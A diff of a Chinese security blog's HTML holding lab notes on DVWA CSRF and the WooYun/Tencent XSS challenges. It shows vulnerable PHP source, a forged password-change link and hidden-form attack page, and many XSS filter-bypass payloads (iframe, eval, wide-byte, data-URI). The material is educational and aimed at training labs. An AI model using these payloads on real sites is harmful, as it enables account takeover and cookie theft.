class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-CSRF-Impossible"><a href="#4-CSRF-Impossible" class="headerlink" title="4. CSRF(Impossible)"></a>4. CSRF(Impossible)</h4><ul>
+<li>impossible级修改密码的界面是需要通过三次输入，即增加了输入当前密码的项，从而能够进行相应的身份认证</li>
+<li>源码分析<ul>
+<li>增加了一个对当前密码的确认，基本无绕过方式（▲ 你知道密码了还改个锤子）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_curr = $_GET[ &apos;password_current&apos; ];</span><br><span class="line">    $pass_new  = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">    $pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">    // Sanitise current password input</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    // Check that the current password is correct</span><br><span class="line">    $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">    $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    // Do both new passwords match and does the current password match the user?</span><br><span class="line">    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">        // It does!</span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update database with new password</span><br><span class="line">        $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );</span><br><span class="line">        $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-CSRF的三种payload形式"><a href="#5-CSRF的三种payload形式" class="headerlink" title="5. CSRF的三种payload形式"></a>5. CSRF的三种payload形式</h4><ul>
+<li>▲ 本节内容来自部分来自婷婷哈大佬和部分来自bmjoker大佬</li>
+<li>构造链接 <ul>
+<li><a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
+<li>当受害者点击了这个链接，他的密码就会被改成test</li>
+<li>▲ CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面</li>
+</ul>
+</li>
+<li>使用短链接来隐藏URL<ul>
+<li>如<a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a>….</li>
+<li>实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的.</li>
+<li>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也不适合现实生活</li>
+</ul>
+</li>
+<li>构造攻击页面<ul>
+<li>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成</li>
+<li>当受害者访问攻击页面时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改了</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Click Me&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-靶场说明"><a href="#6-靶场说明" class="headerlink" title="6. 靶场说明"></a>6. 靶场说明</h4><ul>
+<li>dvwa的CSRF靶场是相对容易的</li>
+<li>无论是对于Referer头还是Token，都有一定的绕过方法</li>
+<li>但更安全的是，验证当前的密码而不是Cookie</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2106,938 +2865,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS%E9%9D%B6%E5%9C%BA--WooYun.tencent/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/02/XSS%E9%9D%B6%E5%9C%BA--WooYun.tencent/" itemprop="url">XSS靶场--Wooyun.tencent</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
-                2020-04-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index">
-                    <span itemprop="name">XSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.6k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  10 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-什么都没过滤的入门情况"><a href="#1-什么都没过滤的入门情况" class="headerlink" title="1. 什么都没过滤的入门情况"></a>1. 什么都没过滤的入门情况</h4><ul>
-<li>XSS的存在，一定是伴随着输入，与输出2个概念的。</li>
-</ul>
-<h4 id="2-输出在-lt-script-gt-lt-script-gt-之间的情况"><a href="#2-输出在-lt-script-gt-lt-script-gt-之间的情况" class="headerlink" title="2. 输出在&lt;script&gt;&lt;/script&gt;之间的情况"></a>2. 输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间的情况</h4><ul>
-<li>如果过滤了<code>&lt;&gt;</code>，就无法构造<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
-<li>可通过js代码eval(‘alert(1)’);voids来进入绕过</li>
-</ul>
-<h4 id="3-输出在HTML属性里的情况"><a href="#3-输出在HTML属性里的情况" class="headerlink" title="3. 输出在HTML属性里的情况"></a>3. 输出在HTML属性里的情况</h4><ul>
-<li>\ 反斜线，而 css里，允许使用转义字符，\ + ascii16进制形式<ul>
-<li>expression, 我们也可以轻松的用expr\65ssion绕过</li>
-<li>▲ css expression 的XSS已经进入暮年了，只有在IE6，7下方能触发，受众面小</li>
-</ul>
-</li>
-<li>在HTML属性中，会自动对实体字符进行转义<ul>
-<li><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</code>和<code>&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</code>是等效的</li>
-<li>url 的编码，&amp;-&gt; %26, # -&gt; %23</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-宽字节复仇记-QQ邮箱基本通用"><a href="#4-宽字节复仇记-QQ邮箱基本通用" class="headerlink" title="4. 宽字节复仇记 [QQ邮箱基本通用]"></a>4. 宽字节复仇记 [QQ邮箱基本通用]</h4><ul>
-<li>前提<ul>
-<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
-<li>gbxxxx系列的编码</li>
-</ul>
-</li>
-<li>过滤：%22 -&gt; %5c%22<ul>
-<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0%22</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-反斜线复仇记"><a href="#5-反斜线复仇记" class="headerlink" title="5. 反斜线复仇记"></a>5. 反斜线复仇记</h4><ul>
-<li>前提<ul>
-<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
-</ul>
-</li>
-<li>绕过转换<ul>
-<li>location.href=”………”+”&amp;ss=aaaa”+”&amp;from=bbb”+”&amp;param=”;</li>
-<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from=bbb”+”&amp;param=”;（\杀掉双引号）</li>
-<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from=1//“+”&amp;param=”;（保证bbb后面的语法正确性，我们把bbb改为一个数字，把bbb后面加上 // 来注释掉后面的部分，但是是错误的，因为&amp;符号优先级高，(“字符串”&amp;from)=1是无法进行这种赋值操作的）</li>
-<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1//“+”&amp;param=”;（==的优先级比 &amp; 高，所以语句相当于 (“字符串”)&amp;(from==1)，但由于from未定义，直接和1进行相等判断的话，会报错，错误是：”from”未定义等）</li>
-<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function from(){}//“+”&amp;param=”;（解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分，function from(){} 就会被提前解析，从而定义了from, 后面 from==1的时候，就不会报错）</li>
-<li>location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function/<strong>/from(){}//“+”&amp;param=”;（空格被转义为了 &amp;nbsp，但可以用注释符来做分隔符，`/</strong>/`替换空格，）</li>
-<li>最终代码：location.href=”………”+”&amp;ss=aaaa&quot;+”&amp;from==1;function/**/from(){}//“+”&amp;param=”;</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-换行符复仇记"><a href="#6-换行符复仇记" class="headerlink" title="6. 换行符复仇记"></a>6. 换行符复仇记</h4><ul>
-<li>前提<ul>
-<li>2中<code>&lt;script&gt;..&lt;/script&gt;</code>之间的情况</li>
-</ul>
-</li>
-<li>源码：//我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</li>
-<li>使用换行符：//我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符 alert(1);//我是输出]</li>
-</ul>
-<h4 id="7-宽字节、反斜线与换行符一起复仇记"><a href="#7-宽字节、反斜线与换行符一起复仇记" class="headerlink" title="7. 宽字节、反斜线与换行符一起复仇记"></a>7. 宽字节、反斜线与换行符一起复仇记</h4><ul>
-<li>注释 -&gt; 换行输出</li>
-<li>\ -&gt; javascript，字符串允许下面多行的写法，可以用\来使进行多行输出</li>
-<li>\ -&gt; 转义：\ -&gt; gbxxx编码系列 -&gt;  %c0可以吃掉%5c</li>
-<li>▲ 具体见代码实例，只能说tql</li>
-</ul>
-<h4 id="8-Dom-Xss入门-显式输出"><a href="#8-Dom-Xss入门-显式输出" class="headerlink" title="8. Dom Xss入门 [显式输出]"></a>8. Dom Xss入门 [显式输出]</h4><ul>
-<li>关注点：关注的不仅是【输出】了什么，还要了解这个页面里，【javascript】拿这个【输出】干了什么</li>
-<li>JS的字符串中的字符可以写为 unicode编码<ul>
-<li>&lt;可以表示为\u003c , &gt;可以表示为\u003e，空格可以表示为\u0020</li>
-<li>在JS字符串里，&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e</li>
-</ul>
-</li>
-<li>常用的js代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;y&quot;).innerHTML=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">document.write(&quot;xxxxxxxxxxxx&quot;);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用了第三方的JS库，譬如jQuery时</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#y&quot;).html(&quot;xxxxxxx&quot;);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>需要注意的地方<ul>
-<li>xxxxx只能使用<code>&lt;img src=1 onerror=alert(1)&gt;</code>这种方式来触发JS。而不能以<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来触发，因为这种压根不会执行<code>&lt;script&gt;..&lt;/script&gt;</code>之间的内容。 IE下，可以使用<code>&lt;script defer&gt;alert(1)&lt;/script&gt;</code></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa.innerHTML=&quot;xxxxxxxxxxxx&quot;;</span><br></pre></td></tr></table></figure>
-
-<h4 id="9-Dom-Xss入门-隐式输出"><a href="#9-Dom-Xss入门-隐式输出" class="headerlink" title="9. Dom Xss入门 [隐式输出]"></a>9. Dom Xss入门 [隐式输出]</h4><ul>
-<li>显示输出：可以在右键查看源代码的时候，看到我们所输出的内容</li>
-<li>隐式输出：ar x=location.href; 这句Javascript实际上进行了一个隐藏的输出操作，即将location.href的内容输出到了x变量中</li>
-<li>对隐式输出的审查方式：F12 -&gt; 调试工具 -&gt; Source -&gt; crtl+F搜索name或id值</li>
-<li>分析js代码的流程，可能不同浏览器对location.href的字符的编码过滤不同<ul>
-<li>可能浏览器对代码的编码使得特殊字符绕过了服务器的过滤从而触发了XSS</li>
-</ul>
-</li>
-</ul>
-<h4 id="10-Dom-XSS进阶-邂逅eval"><a href="#10-Dom-XSS进阶-邂逅eval" class="headerlink" title="10. Dom XSS进阶[邂逅eval]"></a>10. Dom XSS进阶[邂逅eval]</h4><ul>
-<li>一般javascript都会通过document.write或innerHTML将内容输出到网页中，也有可能通过eval输出</li>
-<li>▲ 一般eval进行输出的，源代码和审查元素很难看出来，只有触发错误，在console台的错误输出才有可能发现</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url中为：?key=aaa</span><br><span class="line">源代码中为：eval(&apos;this.&apos;+arg[0]&apos;=&quot;&apos;+arg[1]+&apos;&quot;;&apos;);</span><br><span class="line">输出为：this.key=&quot;aaa&quot;</span><br><span class="line">构造payload：key;alert(1);//=aaa</span><br><span class="line">输出为：this.key;alert(1);//=&quot;aaaa&quot;（如果遇上对&lt;&gt;&quot;编码的话，就不能对后面替换绕过）</span><br></pre></td></tr></table></figure>
-
-<h4 id="11-Dom-XSS进阶-善变iframe"><a href="#11-Dom-XSS进阶-善变iframe" class="headerlink" title="11. Dom XSS进阶[善变iframe]"></a>11. Dom XSS进阶[善变iframe]</h4><ul>
-<li>有时候，输出还会出现在<code>&lt;iframe src=&quot;[输出]&quot;&gt;&lt;/iframe&gt;</code>。 iframe的src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行</li>
-<li>这一类问题，将其归为[路径可控]问题，当然上面说到的是普通的反射型XSS</li>
-<li>有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src=”[可控的url]”; 同样会导致XSS问题</li>
-<li>iframe的变化<ul>
-<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
-<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
-<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
-<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
-<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
-<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
-</ul>
-</li>
-</ul>
-<h4 id="12-Dom-XSS进阶-路径con"><a href="#12-Dom-XSS进阶-路径con" class="headerlink" title="12. Dom XSS进阶[路径con]"></a>12. Dom XSS进阶[路径con]</h4><ul>
-<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
-<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有一种叫做jsonp</li>
-<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
-<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
-<li>地址的可控<ul>
-<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
-<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
-<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
-<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
-</ul>
-</li>
-<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
-</ul>
-</li>
-<li>decodeURIComp -&gt; 解码进行<ul>
-<li>keyword=%26callback=alert(1);</li>
-<li>decodeURIComp就会变为</li>
-<li>&amp;callback=alert(1);</li>
-</ul>
-</li>
-</ul>
-<h4 id="13-Dom-XSS实例-Discuz-X2-5"><a href="#13-Dom-XSS实例-Discuz-X2-5" class="headerlink" title="13. Dom XSS实例[Discuz X2.5]"></a>13. Dom XSS实例[Discuz X2.5]</h4><ul>
-<li>js中，代码可以进行unicode编码，所以需要过滤\</li>
-<li>html中，代码可以进行html实体编码，所以需要过滤&amp;#</li>
-<li>▲ location.href=”脚本” -&gt; location.href会优先加载”脚本”地址，从而跳转到另外一个页面，继而倒是失效，js文件还没来得及加载，可以改进下执行js的方法： location.href=’原来的字符串’.替换(所有字符,”新的字符”);</li>
-<li>▲ alert函数可以改写成：location.href=”javascript:alert(document.cookie)”;</li>
-</ul>
-<h4 id="14-Flash-Xss入门-navigateToURL"><a href="#14-Flash-Xss入门-navigateToURL" class="headerlink" title="14. Flash Xss入门 [navigateToURL]"></a>14. Flash Xss入门 [navigateToURL]</h4><h4 id="15-Flash-Xss进阶-ExternalInterface-call第一个参数"><a href="#15-Flash-Xss进阶-ExternalInterface-call第一个参数" class="headerlink" title="15. Flash Xss进阶 [ExternalInterface.call第一个参数]"></a>15. Flash Xss进阶 [ExternalInterface.call第一个参数]</h4><h4 id="16-Flash-Xss进阶-ExternalInterface-call第二个参数"><a href="#16-Flash-Xss进阶-ExternalInterface-call第二个参数" class="headerlink" title="16. Flash Xss进阶 [ExternalInterface.call第二个参数]"></a>16. Flash Xss进阶 [ExternalInterface.call第二个参数]</h4><h4 id="17-XSS过滤器绕过-通用绕过"><a href="#17-XSS过滤器绕过-通用绕过" class="headerlink" title="17. XSS过滤器绕过 [通用绕过]"></a>17. XSS过滤器绕过 [通用绕过]</h4><ul>
-<li>查看是否被浏览器拦截 -&gt; chrome<ul>
-<li>Refused to execute a javascript script.Source code of script found within request</li>
-<li>查看源码 -&gt; 是否被和谐</li>
-</ul>
-</li>
-<li>绕过通用方法<ul>
-<li>要求<ul>
-<li>缺陷点允许&lt;&gt; </li>
-<li>缺陷点运行=</li>
-<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
-</ul>
-</li>
-<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
-</ul>
-</li>
-</ul>
-<h4 id="18-XSS过滤器绕过-猥琐绕过"><a href="#18-XSS过滤器绕过-猥琐绕过" class="headerlink" title="18. XSS过滤器绕过 [猥琐绕过]"></a>18. XSS过滤器绕过 [猥琐绕过]</h4><ul>
-<li>这里是以 “=” 分割，因而我们的代码中是不允许携带等号的。故上一篇的技巧不能拿到这里来使用</li>
-<li>…”观察地形” -&gt; 怎么形成参数 -&gt; js代码分析</li>
-<li>▲ chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截</li>
-</ul>
-<h4 id="19-存储型XSS入门-什么都没过滤的情况"><a href="#19-存储型XSS入门-什么都没过滤的情况" class="headerlink" title="19. 存储型XSS入门 [什么都没过滤的情况]"></a>19. 存储型XSS入门 [什么都没过滤的情况]</h4><ul>
-<li>反射型是：输入–输出 / 存储型是：输入–进入数据库*–取出数据库–输出。</li>
-<li>差别<ul>
-<li>反射型是：绝大部分情况下，输入在哪里，输出就在哪里</li>
-<li>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</li>
-<li>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）</li>
-<li>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</li>
-</ul>
-</li>
-<li>⭐ 寻找存储型：输出的位置不一定出现在输入的位置<ul>
-<li>先找到输出点，然后猜测此处输出是否会被过滤</li>
-<li>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的</li>
-<li>接着开始测试输入，看输出的效果</li>
-<li>如果没过滤，那么你就成功了，否则你可以放弃掉它</li>
-</ul>
-</li>
-</ul>
-<h4 id="20-存储型XSS入门-套现绕过富文本"><a href="#20-存储型XSS入门-套现绕过富文本" class="headerlink" title="20. 存储型XSS入门 [套现绕过富文本]"></a>20. 存储型XSS入门 [套现绕过富文本]</h4><ul>
-<li>富文本操作<ul>
-<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
